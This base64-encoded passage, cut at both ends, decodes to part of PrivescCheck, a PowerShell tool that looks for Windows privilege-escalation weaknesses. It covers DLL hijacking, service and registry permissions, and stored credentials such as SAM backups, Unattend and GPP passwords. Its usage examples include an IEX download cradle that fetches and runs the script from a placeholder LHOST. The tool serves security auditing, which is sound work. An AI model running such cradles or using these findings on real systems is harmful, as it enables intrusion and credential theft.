3IgLWVxIDYpIC1hbmQgKCRPc1ZlcnNpb24uTWlub3IgLWVxIDEpKSB7CgogICAgICAgIFRlc3QtSGlqYWNrYWJsZURsbCAtU2VydmljZU5hbWUgIk5ldE1hbiIgLURsbE5hbWUgIndsYW5obHAuZGxsIiAtRGVzY3JpcHRpb24gIkxvYWRlZCBieSBOZXRNYW4gd2hlbiBsaXN0aW5nIG5ldHdvcmsgaW50ZXJmYWNlcyIgLVJlYm9vdFJlcXVpcmVkICRGYWxzZQoKICAgIH0KCiAgICAjIFdpbmRvd3MgOCwgOC4xLCAxMAogICAgaWYgKCgkT3NWZXJzaW9uLk1ham9yIC1lcSAxMCkgLW9yICgoJE9zVmVyc2lvbi5NYWpvciAtZXEgNikgLWFuZCAoJE9zVmVyc2lvbi5NaW5vciAtZ2UgMikgLWFuZCAoJE9zVmVyc2lvbi5NaW5vciAtbGUgMykpKSB7CgogICAgICAgIFRlc3QtSGlqYWNrYWJsZURsbCAtU2VydmljZU5hbWUgIk5ldE1hbiIgLURsbE5hbWUgIndsYW5hcGkuZGxsIiAtRGVzY3JpcHRpb24gIkxvYWRlZCBieSBOZXRNYW4gd2hlbiBsaXN0aW5nIG5ldHdvcmsgaW50ZXJmYWNlcyIgLVJlYm9vdFJlcXVpcmVkICRGYWxzZQogICAgICAgIAogICAgfQp9CiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojIEVORCBETEwgSElKQUNLSU5HICAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojZW5kcmVnaW9uIENoZWNrcwoKIyAtLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tCiMgTWFpbiAgCiMgLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLQojcmVnaW9uIE1haW4KCmZ1bmN0aW9uIEludm9rZS1Qcml2ZXNjQ2hlY2sgewogICAgPCMKICAgIC5TWU5PUFNJUwoKICAgIEVudW1lcmF0ZXMgY29tbW9uIHNlY3VyaXR5IG1pc2NvbmZpZ3VyYXRpb25zIHRoYXQgY2FuIGJlIGV4cGxvaXRlZCBmb3IgcHJpdmlsZWdlIGVzY2FsYXRpb24KICAgIHB1cnBvc2VzLgoKICAgIEF1dGhvcjogQGl0bTRuCiAgICBMaWNlbnNlOiBCU0QgMy1DbGF1c2UKICAgIAogICAgLkRFU0NSSVBUSU9OCgogICAgVGhpcyBzY3JpcHQgYWltcyB0byBpZGVudGlmeSBzZWN1cml0eSBtaXNjb25maWd1cmF0aW9ucyB0aGF0IGFyZSByZWxldmFudCBmb3IgcHJpdmlsZWdlIAogICAgZXNjYWxhdGlvbi4gSXQgYWxzbyBwcm92aWRlcyBzb21lIGFkZGl0aW9uYWwgaW5mb3JtYXRpb24gdGhhdCBtYXkgaGVscCBwZW5ldHJhdGlvbiB0ZXN0ZXJzIHRvIAogICAgY2hvb3NlIGJldHdlZW4gc2V2ZXJhbCBwb3RlbnRpYWwgZXhwbG9pdHMuIEZvciBleGFtcGxlLCBpZiB5b3UgZmluZCB0aGF0IGEgc2VydmljZSBpcyAKICAgIHZ1bG5lcmFibGUgdG8gRExMIGhpamFja2luZyBidXQgeW91IGNhbid0IHJlc3RhcnQgaXQgbWFudWFsbHksIHlvdSB3aWxsIGZpbmQgdXNlZnVsIHRvIGtub3cKICAgIGhvcyBvZnRlbiB0aGUgbWFjaGluZSBpcyByZWJvb3RlZCAoaW4gdGhlIGNhc2Ugb2YgYSBzZXJ2ZXIpLiBJZiB5b3Ugc2VlIHRoYXQgaXQgaXMgcmVib290ZWQgCiAgICBldmVyeSBuaWdodCBmb3IgaW5zdGFuY2UsIHlvdSBtYXkgd2FudCB0byBhdHRlbXB0IGFuIGV4cGxvaXQuCgogICAgLlBBUkFNRVRFUiBFeHRlbmRlZAoKICAgIFNldCB0aGlzIGZsYWcgdG8gZW5hYmxlIGV4dGVuZGVkIGNoZWNrcy4KCiAgICAuUEFSQU1FVEVSIEZvcmNlCgogICAgSWdub3JlIHdhcm5pbmdzLgoKICAgIC5QQVJBTUVURVIgU2lsZW50CgogICAgRG9uJ3Qgb3V0cHV0IHRlc3QgcmVzdWx0cywgc2hvdyBvbmx5IHRoZSBmaW5hbCB2dWxuZXJhYmlsaXR5IHJlcG9ydC4KCiAgICAuUEFSQU1FVEVSIFJlcG9ydAoKICAgIEJhc2VuYW1lIChvciBwYXRoICsgYmFzZW5hbWUpIG9mIHRoZSBvdXRwdXQgZmlsZSByZXBvcnQuCgogICAgLlBBUkFNRVRFUiBGb3JtYXQKCiAgICBTZWxlY3QgdGhlIGZvcm1hdCBvZiB0aGUgb3V0cHV0IGZpbGUgKGUuZy46IFRYVCwgSFRNTCBvciBDU1YpLgogICAgCiAgICAuRVhBTVBMRQoKICAgIFBTIEM6XFRlbXBcPiAuIC5cUHJpdmVzY0NoZWNrLnBzMTsgSW52b2tlLVByaXZlc2NDaGVjayAKCiAgICAuRVhBTVBMRSAKCiAgICBDOlxUZW1wXD5wb3dlcnNoZWxsIC1lcCBieXBhc3MgLWMgIi4gLlxQcml2ZXNjQ2hlY2sucHMxOyBJbnZva2UtUHJpdmVzY0NoZWNrIgoKICAgIC5FWEFNUExFCgogICAgQzpcVGVtcFw+cG93ZXJzaGVsbCAiSUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwOi8vTEhPU1Q6TFBPUlQvUAogICAgcml2ZXNjQ2hlY2sucHMxJzsgSW52b2tlLVByaXZlc2NDaGVjayIgCgogICAgIz4KCiAgICBbQ21kbGV0QmluZGluZygpXSBwYXJhbSgKICAgICAgICBbc3dpdGNoXSRFeHRlbmRlZCA9ICRGYWxzZSwKICAgICAgICBbc3dpdGNoXSRGb3JjZSA9ICRGYWxzZSwKICAgICAgICBbc3dpdGNoXSRTaWxlbnQgPSAkRmFsc2UsCiAgICAgICAgI1tzdHJpbmddJE91dEZpbGUsCiAgICAgICAgI1tWYWxpZGF0ZVNldCgiSFRNTCIsICJDU1YiKV1bc3RyaW5nXSRPdXRGb3JtYXQKICAgICAgICBbc3RyaW5nXSRSZXBvcnQsCiAgICAgICAgW1ZhbGlkYXRlU2V0KCJUWFQiLCAiSFRNTCIsICJDU1YiKV1bc3RyaW5nW11dJEZvcm1hdAogICAgKQoKICAgICMgQ2hlY2sgd2V0aGVyIHRoZSBjdXJyZW50IHByb2Nlc3MgaGFzIGFkbWluIHByaXZpbGVnZXMuIAogICAgIyBUaGUgZm9sbG93aW5nIGNoZWNrIHdhcyB0YWtlbiBmcm9tIFBvdypyVXAucHMxCiAgICAkSXNBZG1pbiA9IChbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NQcmluY2lwYWxdIFtTZWN1cml0eS5QcmluY2lwYWwuV2luZG93c0lkZW50aXR5XTo6R2V0Q3VycmVudCgpKS5Jc0luUm9sZShbU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NCdWlsdEluUm9sZV0gIkFkbWluaXN0cmF0b3IiKQogICAgaWYoJElzQWRtaW4pIHsKCiAgICAgICAgaWYgKC1ub3QgJEZvcmNlKSB7CgogICAgICAgICAgICBXcml0ZS1XYXJuaW5nICJZb3UgYXJlIHJ1bm5pbmcgdGhpcyBzY3JpcHQgYXMgYW4gYWRtaW5pc3RyYXRvciEgU29tZSBjaGVja3Mgd2lsbCBiZSBhdXRvbWF0aWNhbGx5IGRpc2FibGVkLiIKICAgICAgICAgICAgV3JpdGUtV2FybmluZyAiWW91IGNhbiBzcGVjaWZ5IHRoZSAnLUZvcmNlJyBvcHRpb24gdG8gZGlzYWJsZSB0aGlzIHdhcm5pbmcgbWVzc2FnZS4iCiAgICAgICAgICAgIFN0YXJ0LVNsZWVwIC1TZWNvbmRzIDEwCiAgICAgICAgfQogICAgfQoKICAgICMgVGhlIGZvbGxvd2luZyBDU1YgZGF0YSBjb250YWlucyBhbGwgdGhlIGNoZWNrcwogICAgJEFsbENoZWNrc0NzdiA9IEAiCiJJZCIsICJGaWxlIiwgIkNvbW1hbmQiLCAiUGFyYW1zIiwgIkNhdGVnb3J5IiwgIkRpc3BsYXlOYW1lIiwgIlR5cGUiLCAiU2V2ZXJpdHkiLCAiRGVzY3JpcHRpb24iLCAiRm9ybWF0IiwgIkV4dGVuZGVkIiwgIlJ1bklmQWRtaW4iCiJVU0VSX1VTRVIiLCAiIiwgIkludm9rZS1Vc2VyQ2hlY2siLCAiIiwgIlVzZXIiLCAiSWRlbnRpdHkiLCAiSW5mbyIsICJJbmZvIiwgIkdldCB0aGUgZnVsbCBuYW1lIG9mIHRoZSBjdXJyZW50IHVzZXIgKGRvbWFpbiArIHVzZXJuYW1lKSBhbG9uZyB3aXRoIHRoZSBhc3NvY2lhdGVkIFNlY3VyaXR5IElkZW50aWZpZXIgKFNJRCkuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiVVNFUl9HUk9VUFMiLCAiIiwgIkludm9rZS1Vc2VyR3JvdXBzQ2hlY2siLCAiIiwgIlVzZXIiLCAiTm9uLWRlZmF1bHQgR3JvdXBzIiwgIkluZm8iLCAiSW5mbyIsICJMaXN0IHRoZSBncm91cHMgdGhlIGN1cnJlbnQgdXNlciBiZWxvbmdzIHRvLiBEZWZhdWx0IGdyb3VwcyBhcmUgZmlsdGVyZWQgb3V0IHRvIG1pbmltaXplIHRoZSBvdXRwdXQuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiVVNFUl9QUklWSUxFR0VTIiwgIiIsICJJbnZva2UtVXNlclByaXZpbGVnZXNDaGVjayIsICIiLCAiVXNlciIsICJQcml2aWxlZ2VzIiwgIlZ1bG4iLCAiSGlnaCIsICJMaXN0IHRoZSBwcml2aWxlZ2VzIHRoYXQgYXJlIGFzc29jaWF0ZWQgdG8gdGhlIGN1cnJlbnQgdXNlcidzIHRva2VuLiBJZiBhbnkgb2YgdGhlbSBjYW4gYmUgbGV2ZXJhZ2VkIHRvIHNvbWVob3cgcnVuIGNvZGUgaW4gdGhlIGNvbnRleHQgb2YgdGhlIFNZU1RFTSBhY2NvdW50LCBpdCB3aWxsIGJlIHJlcG9ydGVkIGFzIGEgZmluZGluZy4iLCAiVGFibGUiLCBGYWxzZSwgRmFsc2UKIlVTRVJfRU5WIiwgIiIsICJJbnZva2UtVXNlckVudkNoZWNrIiwgIiIsICJVc2VyIiwgIkVudmlyb25tZW50IFZhcmlhYmxlcyIsICJJbmZvIiwgIkluZm8iLCAiTGlzdCB0aGUgZW52aXJvbm1lbnQgdmFyaWFibGVzIG9mIHRoZSBjdXJyZW50IHByb2Nlc3MgYW5kIHRyeSB0byBpZGVudGlmeSBhbnkgcG90ZW50aWFsbHkgc2Vuc2l0aXZlIGluZm9ybWF0aW9uIHN1Y2ggYXMgcGFzc3dvcmRzIG9yIEFQSSBzZWNyZXRzLiBUaGlzIGNoZWNrIGlzIHNpbXBseSBiYXNlZCBvbiBrZXl3b3JkIG1hdGNoaW5nIGFuZCBtaWdodCBub3QgYmUgZW50aXJlbHkgcmVsaWFibGUuIiwgIlRhYmxlIiwgRmFsc2UsIFRydWUKIlNFUlZJQ0VfSU5TVEFMTEVEIiwgIiIsICJJbnZva2UtSW5zdGFsbGVkU2VydmljZXNDaGVjayIsICIiLCAiU2VydmljZXMiLCAiTm9uLWRlZmF1bHQgU2VydmljZXMiLCAiSW5mbyIsICJJbmZvIiwgIkxpc3QgYWxsIHJlZ2lzdGVyZWQgc2VydmljZXMgYW5kIGZpbHRlciBvdXQgdGhlIG9uZXMgdGhhdCBhcmUgYnVpbHQgaW50byBXaW5kb3dzLiBJdCBkb2VzIHNvIGJ5IHBhcnNpbmcgdGhlIHRhcmdldCBleGVjdXRhYmxlJ3MgbWV0YWRhdGEuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiU0VSVklDRV9QRVJNSVNTSU9OUyIsICIiLCAiSW52b2tlLVNlcnZpY2VzUGVybWlzc2lvbnNDaGVjayIsICIiLCAiU2VydmljZXMiLCAiU0NNIFBlcm1pc3Npb25zIiwgIlZ1bG4iLCAiSGlnaCIsICJJbnRlcmFjdCB3aXRoIHRoZSBTZXJ2aWNlIENvbnRyb2wgTWFuYWdlciAoU0NNKSBhbmQgY2hlY2sgd2hldGhlciB0aGUgY3VycmVudCB1c2VyIGNhbiBtb2RpZnkgYW55IHJlZ2lzdGVyZWQgc2VydmljZS4iLCAiTGlzdCIsIEZhbHNlLCBGYWxzZQoiU0VSVklDRV9QRVJNSVNTSU9OU19SRUdJU1RSWSIsICIiLCAiSW52b2tlLVNlcnZpY2VzUGVybWlzc2lvbnNSZWdpc3RyeUNoZWNrIiwgIiIsICJTZXJ2aWNlcyIsICJSZWdpc3RyeSBQZXJtaXNzaW9ucyIsICJWdWxuIiwgIkhpZ2giLCAiUGFyc2UgdGhlIHJlZ2lzdHJ5IGFuZCBjaGVjayB3aGV0aGVyIHRoZSBjdXJyZW50IHVzZXIgY2FuIG1vZGlmeSB0aGUgY29uZmlndXJhdGlvbiBvZiBhbnkgcmVnaXN0ZXJlZCBzZXJ2aWNlLiIsICJMaXN0IiwgRmFsc2UsIEZhbHNlCiJTRVJWSUNFX0lNQUdFX1BFUk1JU1NJT05TIiwgIiIsICJJbnZva2UtU2VydmljZXNJbWFnZVBlcm1pc3Npb25zQ2hlY2siLCAiIiwgIlNlcnZpY2VzIiwgIkJpbmFyeSBQZXJtaXNzaW9ucyIsICJWdWxuIiwgIkhpZ2giLCAiTGlzdCBhbGwgc2VydmljZXMgYW5kIGNoZWNrIHdoZXRoZXIgdGhlIGN1cnJlbnQgdXNlciBjYW4gbW9kaWZ5IHRoZSB0YXJnZXQgZXhlY3V0YWJsZSBvciB3cml0ZSBmaWxlcyBpbiBpdHMgcGFyZW50IGZvbGRlci4iLCAiTGlzdCIsIEZhbHNlLCBGYWxzZQoiU0VSVklDRV9VTlFVT1RFRF9QQVRIIiwgIiIsICJJbnZva2UtU2VydmljZXNVbnF1b3RlZFBhdGhDaGVjayIsICIiLCAiU2VydmljZXMiLCAiVW5xdW90ZWQgUGF0aCIsICJWdWxuIiwgIkhpZ2giLCAiTGlzdCByZWdpc3RlcmVkIHNlcnZpY2VzIGFuZCBjaGVjayB3aGV0aGVyIGFueSBvZiB0aGVtIGlzIGNvbmZpZ3VyZWQgd2l0aCBhbiB1bnF1b3RlZCBwYXRoIHRoYXQgY2FuIGJlIGV4cGxvaXRlZC4iLCAiTGlzdCIsIEZhbHNlLCBGYWxzZQoiQVBQX0lOU1RBTExFRCIsICIiLCAiSW52b2tlLUluc3RhbGxlZFByb2dyYW1zQ2hlY2siLCAiIiwgIkFwcHMiLCAiTm9uLWRlZmF1bHQgQXBwcyIsICJJbmZvIiwgIkluZm8iLCAiRW51bWVyYXRlIG5vbi1kZWZhdWx0IGFuZCB0aGlyZC1wYXJ0eSBhcHBsaWNhdGlvbnMgYnkgcGFyc2luZyB0aGUgcmVnaXN0cnkuIiwgIlRhYmxlIiwgVHJ1ZSwgVHJ1ZQoiQVBQX01PRElGSUFCTEUiLCAiIiwgIkludm9rZS1Nb2RpZmlhYmxlUHJvZ3JhbXNDaGVjayIsICIiLCAiQXBwcyIsICJNb2RpZmlhYmxlIEFwcHMiLCAiVnVsbiIsICJNZWRpdW0iLCAiTGlzdCBub24tZGVmYXVsdCBhbmQgdGhpcmQtcGFydHkgYXBwbGljYXRpb25zIGFuZCByZXBvcnQgdGhlIG9uZXMgdGhhdCBjYW4gYmUgbW9kaWZpZWQgYnkgdGhlIGN1cnJlbnQgdXNlci4iLCAiTGlzdCIsIEZhbHNlLCBGYWxzZQoiQVBQX1BST0dSQU1EQVRBIiwgIiIsICJJbnZva2UtUHJvZ3JhbURhdGFDaGVjayIsICIiLCAiQXBwcyIsICJQcm9ncmFtRGF0YSBmb2xkZXJzL2ZpbGVzIiwgIkluZm8iLCAiSW5mbyIsICJMaXN0IHRoZSBub24tZGVmYXVsdCBQcm9ncmFtRGF0YSBmb2xkZXJzIGFuZCBjaGVjayB3aGV0aGVyIHRoZSBjdXJyZW50IHVzZXIgaGFzIHdyaXRlIHBlcm1pc3Npb25zLiBUaGlzIGNoZWNrIGlzIHB1cmVseSBpbmZvcm1hdGl2ZSBhbmQgdGhlIHJlc3VsdHMgcmVxdWlyZSBtYW51YWwgYW5hbHlzaXMuIiwgIkxpc3QiLCBUcnVlLCBGYWxzZQoiQVBQX1NUQVJUVVAiLCAiIiwgIkludm9rZS1BcHBsaWNhdGlvbnNPblN0YXJ0dXBDaGVjayIsICIiLCAiQXBwcyIsICJTdGFydHVwIEFwcHMiLCAiSW5mbyIsICJJbmZvIiwgIkVudW1lcmF0ZSB0aGUgc3lzdGVtLXdpZGUgYXBwbGljYXRpb25zIHRoYXQgYXJlIHJ1biBvbiBzdGFydC11cC4iLCAiTGlzdCIsIFRydWUsIFRydWUKIkFQUF9TVEFSVFVQX1ZVTE4iLCAiIiwgIkludm9rZS1BcHBsaWNhdGlvbnNPblN0YXJ0dXBWdWxuQ2hlY2siLCAiIiwgIkFwcHMiLCAiTW9kaWZpYWJsZSBTdGFydHVwIEFwcHMiLCAiVnVsbiIsICJNZWRpdW0iLCAiRW51bWVyYXRlIHRoZSBzeXN0ZW0td2lkZSBhcHBsaWNhdGlvbnMgdGhhdCBhcmUgcnVuIG9uIHN0YXJ0LXVwIGFuZCBjaGVjayB3aGV0aGVyIHRoZXkgY2FuIGJlIG1vZGlmaWVkIGJ5IHRoZSBjdXJyZW50IHVzZXIuIiwgIkxpc3QiLCBGYWxzZSwgRmFsc2UKIkFQUF9QUk9DRVNTRVMiLCAiIiwgIkludm9rZS1SdW5uaW5nUHJvY2Vzc0NoZWNrIiwgIiIsICJBcHBzIiwgIlJ1bm5pbmcgUHJvY2Vzc2VzIiwgIkluZm8iLCAiSW5mbyIsICJMaXN0IHByb2Nlc3NlcyB0aGF0IGFyZSBub3Qgb3duZWQgYnkgdGhlIGN1cnJlbnQgdXNlciBhbmQgZmlsdGVyIG91dCBjb21tb24gcHJvY2Vzc2VzIHN1Y2ggYXMgJ3N2Y2hvc3QuZXhlJy4iLCAiVGFibGUiLCBUcnVlLCBUcnVlCiJTQ0hUQVNLU19JTUFHRV9QRVJNSVNTSU9OUyIsICIiLCAiSW52b2tlLVNjaGVkdWxlZFRhc2tzSW1hZ2VQZXJtaXNzaW9uc0NoZWNrIiwgIiIsICJTY2hlZHVsZWQgVGFza3MiLCAiQmluYXJ5IFBlcm1pc3Npb25zIiwgIlZ1bG4iLCAiTWVkaXVtIiwgIkVudW1lcmF0ZSB0aGUgc2NoZWR1bGVkIHRhc2tzIHRoYXQgYXJlIG5vdCBvd25lZCBieSB0aGUgY3VycmVudCB1c2VyIGFuZCBjaGVja3Mgd2hldGhlciB0aGUgdGFyZ2V0IGJpbmFyeSBjYW4gYmUgbW9kaWZpZWQuIE5vdGUgdGhhdCwgYXMgYSBsb3ctcHJpdmlsZWdlZCB1c2VyLCBpdCdzIG5vdCBwb3NzaWJsZSB0byBlbnVtZXJhdGUgYWxsIHRoZSBzY2hlZHVsZWQgdGFza3MuIiwgIkxpc3QiLCBGYWxzZSwgRmFsc2UKIlNDSFRBU0tTX1VOUVVPVEVEX1BBVEgiLCAiIiwgIkludm9rZS1TY2hlZHVsZWRUYXNrc1VucXVvdGVkUGF0aENoZWNrIiwgIiIsICJTY2hlZHVsZWQgVGFza3MiLCAiVW5xdW90ZWQgUGF0aCIsICJWdWxuIiwgIk1lZGl1bSIsICJFbnVtZXJhdGUgdGhlIHNjaGVkdWxlZCB0YXNrcyB0aGF0IGFyZSBub3Qgb3duZWQgYnkgdGhlIGN1cnJlbnQgdXNlciBhbmQgY2hlY2tzIHdoZXRoZXIgdGhlIGNvcnJlc3BvbmRpbmcgY29tbWFuZCB1c2VzIGFuIGV4cGxvaXRhYmxlIHVucXVvdGVkIHBhdGguIE5vdGUgdGhhdCwgYXMgYSBsb3ctcHJpdmlsZWdlZCB1c2VyLCBpdCdzIG5vdCBwb3NzaWJsZSB0byBlbnVtZXJhdGUgYWxsIHRoZSBzY2hlZHVsZWQgdGFza3MuIiwgIkxpc3QiLCBGYWxzZSwgRmFsc2UKIkNSRURTX1NBTV9CS1AiLCAiIiwgIkludm9rZS1TYW1CYWNrdXBGaWxlc0NoZWNrIiwgIiIsICJDcmVkcyIsICJTQU0vU1lTVEVNIEJhY2t1cCBGaWxlcyIsICJWdWxuIiwgIk1lZGl1bSIsIENoZWNrIHdoZXRoZXIgc29tZSBiYWNrdXAgZmlsZXMgb2YgdGhlIFNBTS9TWVNURU0gaGl2ZXMgd2VyZSBjcmVhdGVkIHdpdGggaW5zZWN1cmUgcGVybWlzc2lvbnMuIiwgIkxpc3QiLCBGYWxzZSwgRmFsc2UKIkNSRURTX1VOQVRURU5EIiwgIiIsICJJbnZva2UtVW5hdHRlbmRGaWxlc0NoZWNrIiwgIiIsICJDcmVkcyIsICJVbmF0dGVuZCBGaWxlcyIsICJWdWxuIiwgIk1lZGl1bSIsICJMb2NhdGUgJ1VuYXR0ZW5kJyBmaWxlcyBhbmQgY2hlY2sgd2hldGhlciB0aGV5IGNvbnRhaW4gYW55IGNsZWFyLXRleHQgY3JlZGVudGlhbHMuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiQ1JFRFNfV0lOTE9HT04iLCAiIiwgIkludm9rZS1XaW5sb2dvbkNoZWNrIiwgIiIsICJDcmVkcyIsICJXaW5Mb2dvbiIsICJWdWxuIiwgIk1lZGl1bSIsICJQYXJzZSB0aGUgV2lubG9nb24gcmVnaXN0cnkga2V5cyBhbmQgY2hlY2sgd2hldGhlciB0aGV5IGNvbnRhaW4gYW55IGNsZWFyLXRleHQgcGFzc3dvcmQuIEVudHJpZXMgdGhhdCBoYXZlIGFuIGVtcHR5IHBhc3N3b3JkIGZpZWxkIGFyZSBmaWx0ZXJlZCBvdXQuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiQ1JFRFNfQ1JFRF9GSUxFUyIsICIiLCAiSW52b2tlLUNyZWRlbnRpYWxGaWxlc0NoZWNrIiwgIiIsICJDcmVkcyIsICJDcmVkZW50aWFsIEZpbGVzIiwgIkluZm8iLCAiSW5mbyIsICJFbnVtZXJhdGUgdGhlIGNyZWRlbnRpYWwgZmlsZXMgdGhhdCBhcmUgcHJlc2VudCBpbiB0aGUgY3VycmVudCB1c2VyJ3MgSE9NRSBmb2xkZXIuIFRoaXMgaXMgcHVyZWx5IGluZm9ybWF0aXZlLiIsICJMaXN0IiwgVHJ1ZSwgVHJ1ZQoiQ1JFRFNfVkFVTFRfQ1JFRCIsICIiLCAiSW52b2tlLVZhdWx0Q3JlZENoZWNrIiwgIiIsICJDcmVkcyIsICJDcmVkZW50aWFsIE1hbmFnZXIiLCAiSW5mbyIsICJJbmZvIiwgIkVudW1lcmF0ZSB0aGUgY3JlZGVudGlhbHMgdGhhdCBhcmUgc2F2ZWQgaW4gdGhlIGN1cnJlbnQgdXNlcidzIHZhdWx0LiIsICJMaXN0IiwgRmFsc2UsIFRydWUKIkNSRURTX1ZBVUxUX0xJU1QiLCAiIiwgIkludm9rZS1WYXVsdExpc3RDaGVjayIsICIiLCAiQ3JlZHMiLCAiQ3JlZGVudGlhbCBNYW5hZ2VyICh3ZWIpIiwgIkluZm8iLCAiSW5mbyIsICJFbnVtZXJhdGUgdGhlIHdlYiBjcmVkZW50aWFscyB0aGF0IGFyZSBzYXZlZCBpbiB0aGUgY3VycmVudCB1c2VyJ3MgVmF1bHQuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiQ1JFRFNfR1BQIiwgIiIsICJJbnZva2UtR1BQUGFzc3dvcmRDaGVjayIsICIiLCAiQ3JlZHMiLCAiR1BQIFBhc3N3b3JkcyIsICJWdWxuIiwgIk1lZGl1bSIsICJMb2NhdGUgb2xkIGNhY2hlZCBHcm91cCBQb2xpY3kgUHJlZmVyZW5jZSBmaWxlcyB0aGF0IGNvbnRhaW4gYSAnY3Bhc3N3b3JkJyBmaWVsZCBhbmQgZXh0cmFjdCB0aGUgY2xlYXItdGV4dCBjcmVkZW50aWFscy4iLCAiTGlzdCIsIEZhbHNlLCBUcnVlCiJDUkVEU19QU19ISVNUIiwgIiIsICJJbnZva2UtUG93ZXJTaGVsbEhpc3RvcnlDaGVjayIsICIiLCAiQ3JlZHMiLCAiUG93ZXJTaGVsbCBIaXN0b3J5IiwgIkluZm8iLCAiSW5mbyIsICJMb2NhdGUgdGhlIGN1cnJlbnQgdXNlcidzIFBvd2VyU2hlbGwgaGlzdG9yeSBmaWxlIGFuZCBjaGVjayB3aGV0aGVyIGl0IGNvbnRhaW5zIHNvbWUgY2xlYXItdGV4dCBjcmVkZW50aWFscy4gVGhpcyBjaGVjayBpcyBzaW1wbHkgYmFzZWQgb24ga2V5d29yZCBtYXRjaGluZyBhbmQgbWlnaHQgbm90IGJlIGVudGlyZWx5IHJlbGlhYmxlLiIsICJMaXN0IiwgVHJ1ZSwgVHJ1ZQoiSEFSREVOX1VBQyIsICIiLCAiSW52b2tlLVVhY0NoZWNrIiwgIiIsICJIYXJkZW5pbmciLCAiVUFDIFNldHRpbmdzIiwgIkluZm8iLCAiSW5mbyIsICJSZXRyaWV2ZSB0aGUgVXNlciBBY2Nlc3MgQ29udHJvbCAoVUFDKSBjb25maWd1cmF0aW9uIGFuZCBjaGVjayB3aGV0aGVyIGl0IGlzIGVuYWJsZWQuIiwgIkxpc3QiLCBUcnVlLCBUcnVlCiJIQVJERU5fTFNBIiwgIiIsICJJbnZva2UtTHNhUHJvdGVjdGlvbnNDaGVjayIsICIiLCAiSGFyZGVuaW5nIiwgIkxTQSBwcm90ZWN0aW9ucyIsICJJbmZvIiwgIkluZm8iLCAiQ2hlY2sgd2hldGhlciAnbHNhc3MnIHJ1bnMgYXMgYSBQcm90ZWN0ZWQgUHJvY2VzcyBMaWdodCBhbmQvb3IgaWYgQ3JlZGVudGlhbCBHdWFyZCBpcyBlbmFibGVkLiIsICJUYWJsZSIsIEZhbHNlLCBUcnVlCiJIQVJERU5fTEFQUyIsICIiLCAiSW52b2tlLUxhcHNDaGVjayIsICIiLCAiSGFyZGVuaW5nIiwgIkxBUFMgU2V0dGluZ3MiLCAiSW5mbyIsICJJbmZvIiwgIlBhcnNlIHRoZSByZWdpc3RyeSBhbmQgZGV0ZXJtaW5lIHdoZXRoZXIgTEFQUyBpcyBjb25maWd1cmVkIGFuZCBlbmFibGVkLiIsICJMaXN0IiwgVHJ1ZSwgVHJ1ZQoiSEFSREVOX1BTX1RSQU5TQ1JJUFQiLCAiIiwgIkludm9rZS1Qb3dlcnNoZWxsVHJhbnNjcmlwdGlvbkNoZWNrIiwgIiIsICJIYXJkZW5pbmciLCAiUG93ZXJTaGVsbCBUcmFuc2NyaXB0aW9uIiwgIkluZm8iLCAiSW5mbyIsICJDaGVjayB3aGV0aGVyIFBvd2VyU2hlbGwgVHJhbnNjcmlwdGlvbiBpcyBjb25maWd1cmVkIGFuZCBlbmFibGVkLiBJZiBzbywgdGhlIHBhdGggb2YgdGhlIG91dHB1dCBsb2cgZmlsZSB3aWxsIGJlIHJldHVybmVkLiIsICJMaXN0IiwgVHJ1ZSwgVHJ1ZQoiSEFSREVOX0JJVExPQ0tFUiIsICIiLCAiSW52b2tlLUJpdGxvY2tlckNoZWNrIiwgIiIsICJIYXJkZW5pbmciLCAiQml0TG9ja2VyIiwgIlZ1bG4iLCAiTWVkaXVtIiwgIkNoZWNrIHdoZXRoZXIgQml0TG9ja2VyIGlzIGNvbmZpZ3VyZWQgYW5kIGVuYWJsZWQgb24gdGhlIHN5c3RlbSBkcml2ZS4gTm90ZSB0aGF0IHRoaXMgY2hlY2sgd2lsbCB5aWVsZCBhIGZhbHNlIHBvc2l0aXZlIGlmIGFub3RoZXIgZW5jcnlwdGlvbiBzb2Z0d2FyZSBpcyBpbiB1c2UuIiwgIkxpc3QiLCBGYWxzZSwgVHJ1ZQoiQ09ORklHX1BBVEhfRk9MREVSUyIsICIiLCAiSW52b2tlLURsbEhpamFja2luZ0NoZWNrIiwgIiIsICJDb25maWciLCAiUEFUSCBGb2xkZXIgUGVybWlzc2lvbnMiLCAiVnVsbiIsICJIaWdoIiwgIlJldHJpZXZlIHRoZSBsaXN0IG9mIFNZU1RFTSAlUEFUSCUgZm9sZGVycyBhbmQgY2hlY2sgd2hldGhlciB0aGUgY3VycmVudCB1c2VyIGhhcyBzb21lIHdyaXRlIHBlcm1pc3Npb25zIGluIGFueSBvZiB0aGVtLiIsICJMaXN0IiwgRmFsc2UsIEZhbHNlCiJNSVNDX0hJSkFDS0FCTEVfRExMIiwgIiIsICJJbnZva2UtSGlqYWNrYWJsZURsbHNDaGVjayIsICIiLCAiTWlzYyIsICJIaWphY2thYmxlIERMTHMiLCAiSW5mbyIsICJJbmZvIiwgIkxpc3QgV2luZG93cyBzZXJ2aWNlcyB0aGF0IGFyZSBwcm9uZSB0byBHaG9zdCBETEwgaGlqYWNraW5nLiBUaGlzIGlzIHBhcnRpY3VsYXJseSByZWxldmFudCBpZiB0aGUgY3VycmVudCB1c2VyIGNhbiBjcmVhdGUgZmlsZXMgaW4gb25lIG9mIHRoZSBTWVNURU0gJVBBVEglIGZvbGRlcnMuIiwg